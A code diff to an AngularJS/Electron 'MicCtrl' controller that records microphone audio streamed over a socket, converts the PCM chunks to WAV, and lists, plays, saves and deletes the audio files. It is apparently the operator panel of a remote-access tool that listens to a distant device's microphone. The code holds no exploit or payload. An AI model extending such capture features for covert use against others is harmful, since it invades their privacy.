@@ -583,12 +583,163 @@ app.controller("MicCtrl", function ($scope, $rootScope, $timeout) {
     $MicCtrl = $scope;
     $MicCtrl.isAudio = true;
     $MicCtrl.isStreaming = false;
+    $MicCtrl.hasRecordedData = false; // Track if there's recorded data to save
+    $MicCtrl.savedAudioFiles = []; // List of saved audio files
+    $MicCtrl.loadingAudioList = false;
     var mic = CONSTANTS.orders.mic;
     var audioContext = null;
     var scriptProcessor = null;
     var audioQueue = [];
+    var recordedChunks = []; // Store all PCM chunks for recording
     var isPlaying = false;
     var sampleRate = 44100;
+
+    // Load saved audio files list
+    $MicCtrl.loadSavedAudioFiles = () => {
+        $MicCtrl.loadingAudioList = true;
+        
+        fs.readdir(downloadsPath, (err, files) => {
+            if (err) {
+                console.error('Error reading downloads directory:', err);
+                $rootScope.Log('Error loading audio files: ' + err.message, CONSTANTS.logStatus.FAIL);
+                $MicCtrl.loadingAudioList = false;
+                $MicCtrl.$apply();
+                return;
+            }
+            
+            // Filter only audio files
+            var audioExtensions = ['.mp3', '.wav', '.m4a', '.ogg', '.aac'];
+            var audioFiles = files.filter(file => {
+                var ext = path.extname(file).toLowerCase();
+                return audioExtensions.includes(ext);
+            });
+            
+            // Sort by modification time (newest first)
+            var filesWithStats = [];
+            var processed = 0;
+            
+            if (audioFiles.length === 0) {
+                $MicCtrl.savedAudioFiles = [];
+                $MicCtrl.loadingAudioList = false;
+                $MicCtrl.$apply();
+                return;
+            }
+            
+            audioFiles.forEach((file, index) => {
+                var filePath = path.join(downloadsPath, file);
+                fs.stat(filePath, (err, stats) => {
+                    if (!err) {
+                        filesWithStats.push({
+                            name: file,
+                            path: filePath,
+                            size: stats.size,
+                            modified: stats.mtime,
+                            extension: path.extname(file).toLowerCase()
+                        });
+                    }
+                    
+                    processed++;
+                    if (processed === audioFiles.length) {
+                        // Sort by modification time (newest first)
+                        filesWithStats.sort((a, b) => b.modified - a.modified);
+                        $MicCtrl.savedAudioFiles = filesWithStats;
+                        $MicCtrl.loadingAudioList = false;
+                        $MicCtrl.$apply();
+                    }
+                });
+            });
+        });
+    };
+
+    // Load audio file and play it
+    $MicCtrl.playSavedAudio = (audioFile) => {
+        $rootScope.Log('Loading audio: ' + audioFile.name, CONSTANTS.logStatus.INFO);
+        
+        fs.readFile(audioFile.path, (err, data) => {
+            if (err) {
+                $rootScope.Log('Error loading audio file: ' + err.message, CONSTANTS.logStatus.FAIL);
+                return;
+            }
+            
+            try {
+                var uint8Arr = new Uint8Array(data);
+                var binary = '';
+                for (var i = 0; i < uint8Arr.length; i++) {
+                    binary += String.fromCharCode(uint8Arr[i]);
+                }
+                var base64String = window.btoa(binary);
+                
+                var player = document.getElementById('player');
+                var sourceMp3 = document.getElementById('sourceMp3');
+                var sourceWav = document.getElementById('sourceWav');
+                
+                // Determine MIME type based on extension
+                var mimeType = 'audio/mp3';
+                if (audioFile.extension === '.wav') {
+                    mimeType = 'audio/wav';
+                } else if (audioFile.extension === '.m4a') {
+                    mimeType = 'audio/mp4';
+                } else if (audioFile.extension === '.ogg') {
+                    mimeType = 'audio/ogg';
+                } else if (audioFile.extension === '.aac') {
+                    mimeType = 'audio/aac';
+                }
+                
+                $MicCtrl.isAudio = false;
+                $MicCtrl.$apply();
+                
+                // Clear previous sources
+                sourceMp3.src = "";
+                if (sourceWav) {
+                    sourceWav.src = "";
+                }
+                
+                // Set appropriate source
+                if (audioFile.extension === '.wav' && sourceWav) {
+                    sourceWav.src = "data:" + mimeType + ";base64," + base64String;
+                } else {
+                    sourceMp3.src = "data:" + mimeType + ";base64," + base64String;
+                }
+                
+                player.load();
+                player.play();
+                
+                $rootScope.Log('Playing: ' + audioFile.name, CONSTANTS.logStatus.SUCCESS);
+            } catch (e) {
+                console.error('Error processing audio file:', e);
+                $rootScope.Log('Error processing audio file: ' + e.message, CONSTANTS.logStatus.FAIL);
+            }
+        });
+    };
+
+    // Format file size
+    $MicCtrl.formatFileSize = (bytes) => {
+        if (bytes === 0) return '0 Bytes';
+        var k = 1024;
+        var sizes = ['Bytes', 'KB', 'MB', 'GB'];
+        var i = Math.floor(Math.log(bytes) / Math.log(k));
+        return Math.round(bytes / Math.pow(k, i) * 100) / 100 + ' ' + sizes[i];
+    };
+
+    // Format date
+    $MicCtrl.formatDate = (date) => {
+        return new Date(date).toLocaleString();
+    };
+
+    // Delete audio file
+    $MicCtrl.deleteAudioFile = (audioFile) => {
+        fs.unlink(audioFile.path, (err) => {
+            if (err) {
+                $rootScope.Log('Error deleting file: ' + err.message, CONSTANTS.logStatus.FAIL);
+            } else {
+                $rootScope.Log('File deleted: ' + audioFile.name, CONSTANTS.logStatus.SUCCESS);
+                $MicCtrl.loadSavedAudioFiles(); // Reload list
+            }
+        });
+    };
+
+    // Load audio files on controller init
+    $MicCtrl.loadSavedAudioFiles();
 
     $MicCtrl.$on('$destroy', function () {
         // release resources, cancel Listner...
@@ -620,6 +771,10 @@ app.controller("MicCtrl", function ($scope, $rootScope, $timeout) {
         $MicCtrl.isStreaming = true;
         $MicCtrl.isAudio = false;
         audioQueue = [];
+        recordedChunks = []; // Reset recorded chunks when starting new stream
+        $MicCtrl.hasRecordedData = false;
+        $MicCtrl.recordedWavBuffer = null; // Clear previous recording
+        $MicCtrl.recordedFileName = null;
         isPlaying = false;
         
         // Initialize Web Audio API for real-time PCM playback
@@ -687,11 +842,169 @@ app.controller("MicCtrl", function ($scope, $rootScope, $timeout) {
         audioQueue = [];
         isPlaying = false;
         
-        $timeout(function() {
-            if (!$MicCtrl.$$phase && !$MicCtrl.$root.$$phase) {
-                $MicCtrl.$apply();
+        // Convert recorded chunks to WAV and add to audio player
+        if (recordedChunks.length > 0) {
+            $rootScope.Log('Processing recorded audio...', CONSTANTS.logStatus.INFO);
+            
+            try {
+                // Convert PCM chunks to WAV
+                var wavBuffer = convertPCMToWAV(recordedChunks, sampleRate, 1);
+                
+                // Convert ArrayBuffer to base64 for audio tag
+                var uint8Arr = new Uint8Array(wavBuffer);
+                var binary = '';
+                for (var i = 0; i < uint8Arr.length; i++) {
+                    binary += String.fromCharCode(uint8Arr[i]);
+                }
+                var base64String = window.btoa(binary);
+                
+                // Add to audio player
+                var player = document.getElementById('player');
+                var sourceMp3 = document.getElementById('sourceMp3');
+                var sourceWav = document.getElementById('sourceWav');
+                
+                $MicCtrl.isAudio = false;
+                // Clear MP3 source and set WAV source
+                sourceMp3.src = "";
+                if (sourceWav) {
+                    sourceWav.src = "data:audio/wav;base64," + base64String;
+                } else {
+                    // Fallback to MP3 source if WAV source doesn't exist
+                    sourceMp3.src = "data:audio/wav;base64," + base64String;
+                }
+                player.load();
+                
+                // Store WAV buffer for saving
+                $MicCtrl.recordedWavBuffer = Buffer.from(wavBuffer);
+                $MicCtrl.recordedFileName = 'audio_stream_' + Date.now() + '.wav';
+                
+                $rootScope.Log('Audio ready for playback', CONSTANTS.logStatus.SUCCESS);
+                
+                $timeout(function() {
+                    if (!$MicCtrl.$$phase && !$MicCtrl.$root.$$phase) {
+                        $MicCtrl.$apply();
+                    }
+                }, 0);
+            } catch (e) {
+                console.error('Error processing recorded audio:', e);
+                $rootScope.Log('Error processing recorded audio: ' + e.message, CONSTANTS.logStatus.FAIL);
+                
+                $timeout(function() {
+                    if (!$MicCtrl.$$phase && !$MicCtrl.$root.$$phase) {
+                        $MicCtrl.$apply();
+                    }
+                }, 0);
             }
-        }, 0);
+        } else {
+            // No recorded data, just update UI
+            $timeout(function() {
+                if (!$MicCtrl.$$phase && !$MicCtrl.$root.$$phase) {
+                    $MicCtrl.$apply();
+                }
+            }, 0);
+        }
+    }
+
+    // Function to convert PCM16 data to WAV format
+    function convertPCMToWAV(pcmChunks, sampleRate, channels) {
+        channels = channels || 1; // Mono by default
+        
+        // Calculate total data length
+        var totalLength = 0;
+        for (var i = 0; i < pcmChunks.length; i++) {
+            totalLength += pcmChunks[i].length;
+        }
+        
+        var dataLength = totalLength;
+        var buffer = new ArrayBuffer(44 + dataLength);
+        var view = new DataView(buffer);
+        
+        // WAV header
+        function writeString(offset, string) {
+            for (var i = 0; i < string.length; i++) {
+                view.setUint8(offset + i, string.charCodeAt(i));
+            }
+        }
+        
+        // RIFF header
+        writeString(0, 'RIFF');
+        view.setUint32(4, 36 + dataLength, true);
+        writeString(8, 'WAVE');
+        
+        // fmt chunk
+        writeString(12, 'fmt ');
+        view.setUint32(16, 16, true); // chunk size
+        view.setUint16(20, 1, true); // audio format (1 = PCM)
+        view.setUint16(22, channels, true); // number of channels
+        view.setUint32(24, sampleRate, true); // sample rate
+        view.setUint32(28, sampleRate * channels * 2, true); // byte rate
+        view.setUint16(32, channels * 2, true); // block align
+        view.setUint16(34, 16, true); // bits per sample
+        
+        // data chunk
+        writeString(36, 'data');
+        view.setUint32(40, dataLength, true);
+        
+        // Write PCM data
+        var offset = 44;
+        for (var i = 0; i < pcmChunks.length; i++) {
+            var chunk = pcmChunks[i];
+            for (var j = 0; j < chunk.length; j++) {
+                view.setUint8(offset++, chunk[j]);
+            }
+        }
+        
+        return buffer;
+    }
+
+    // Function to save the recorded stream
+    $MicCtrl.SaveStreamRecording = () => {
+        // Use already converted WAV buffer if available (from StopStream)
+        if ($MicCtrl.recordedWavBuffer && $MicCtrl.recordedFileName) {
+            var filePath = path.join(downloadsPath, $MicCtrl.recordedFileName);
+            
+            $rootScope.Log('Saving recording...');
+            fs.outputFile(filePath, $MicCtrl.recordedWavBuffer, (err) => {
+                if (err) {
+                    $rootScope.Log('Saving recording failed: ' + err.message, CONSTANTS.logStatus.FAIL);
+                } else {
+                    var duration = (recordedChunks.reduce(function(sum, chunk) { return sum + chunk.length; }, 0) / 2 / sampleRate).toFixed(2);
+                    $rootScope.Log('Recording saved on ' + filePath + ' (Duration: ' + duration + 's)', CONSTANTS.logStatus.SUCCESS);
+                    $MicCtrl.loadSavedAudioFiles(); // Reload audio files list
+                }
+            });
+        } else if (recordedChunks.length > 0) {
+            // Fallback: convert on the fly if buffer not available
+            $rootScope.Log('Converting PCM to WAV format...', CONSTANTS.logStatus.INFO);
+            
+            try {
+                // Convert PCM chunks to WAV
+                var wavBuffer = convertPCMToWAV(recordedChunks, sampleRate, 1);
+                
+                // Convert ArrayBuffer to Node.js Buffer
+                var nodeBuffer = Buffer.from(wavBuffer);
+                
+                // Save to file
+                var fileName = 'audio_stream_' + Date.now() + '.wav';
+                var filePath = path.join(downloadsPath, fileName);
+                
+                $rootScope.Log('Saving recording...');
+                    fs.outputFile(filePath, nodeBuffer, (err) => {
+                        if (err) {
+                            $rootScope.Log('Saving recording failed: ' + err.message, CONSTANTS.logStatus.FAIL);
+                        } else {
+                            var duration = (recordedChunks.reduce(function(sum, chunk) { return sum + chunk.length; }, 0) / 2 / sampleRate).toFixed(2);
+                            $rootScope.Log('Recording saved on ' + filePath + ' (Duration: ' + duration + 's)', CONSTANTS.logStatus.SUCCESS);
+                            $MicCtrl.loadSavedAudioFiles(); // Reload audio files list
+                        }
+                    });
+            } catch (e) {
+                console.error('Error saving recording:', e);
+                $rootScope.Log('Error saving recording: ' + e.message, CONSTANTS.logStatus.FAIL);
+            }
+        } else {
+            $rootScope.Log('No audio data to save. Start streaming first.', CONSTANTS.logStatus.WARNING);
+        }
     }
 
     socket.on(mic, (data) => {
@@ -714,6 +1027,11 @@ app.controller("MicCtrl", function ($scope, $rootScope, $timeout) {
                 // Add to audio queue for playback
                 audioQueue.push(uint8Arr);
                 
+                // Also store chunk for recording (keep a copy)
+                var chunkCopy = new Uint8Array(uint8Arr);
+                recordedChunks.push(chunkCopy);
+                $MicCtrl.hasRecordedData = true;
+                
                 // Limit queue size to prevent memory issues
                 if (audioQueue.length > 10) {
                     audioQueue.shift(); // Remove oldest chunk
@@ -729,6 +1047,7 @@ app.controller("MicCtrl", function ($scope, $rootScope, $timeout) {
 
             var player = document.getElementById('player');
             var sourceMp3 = document.getElementById('sourceMp3');
+            var sourceWav = document.getElementById('sourceWav');
             var uint8Arr = new Uint8Array(data.buffer);
             var binary = '';
             for (var i = 0; i < uint8Arr.length; i++) {
@@ -736,23 +1055,42 @@ app.controller("MicCtrl", function ($scope, $rootScope, $timeout) {
             }
             var base64String = window.btoa(binary);
 
+            // Clear recorded stream data when new recording arrives
+            $MicCtrl.recordedWavBuffer = null;
+            $MicCtrl.recordedFileName = null;
+            recordedChunks = [];
+            $MicCtrl.hasRecordedData = false;
+
             $MicCtrl.isAudio = false;
             $MicCtrl.$apply();
+            // Clear WAV source and set MP3 source
+            if (sourceWav) {
+                sourceWav.src = "";
+            }
             sourceMp3.src = "data:audio/mp3;base64," + base64String;
             player.load();
             player.play();
 
             $MicCtrl.SaveAudio = () => {
-                $rootScope.Log('Saving file..');
-                var filePath = path.join(downloadsPath, data.name);
-                fs.outputFile(filePath, data.buffer, (err) => {
-                    if (err)
-                        $rootScope.Log('Saving file failed', CONSTANTS.logStatus.FAIL);
-                    else
-                        $rootScope.Log('File saved on ' + filePath, CONSTANTS.logStatus.SUCCESS);
-                });
-
-
+                // Check if there's a recorded stream to save
+                if ($MicCtrl.recordedWavBuffer && $MicCtrl.recordedFileName) {
+                    // Save recorded stream
+                    $MicCtrl.SaveStreamRecording();
+                } else if (data && data.name) {
+                    // Save regular recording (MP3)
+                    $rootScope.Log('Saving file..');
+                    var filePath = path.join(downloadsPath, data.name);
+                    fs.outputFile(filePath, data.buffer, (err) => {
+                        if (err)
+                            $rootScope.Log('Saving file failed', CONSTANTS.logStatus.FAIL);
+                        else {
+                            $rootScope.Log('File saved on ' + filePath, CONSTANTS.logStatus.SUCCESS);
+                            $MicCtrl.loadSavedAudioFiles(); // Reload audio files list
+                        }
+                    });
+                } else {
+                    $rootScope.Log('No audio to save', CONSTANTS.logStatus.WARNING);
+                }
             };
 
 
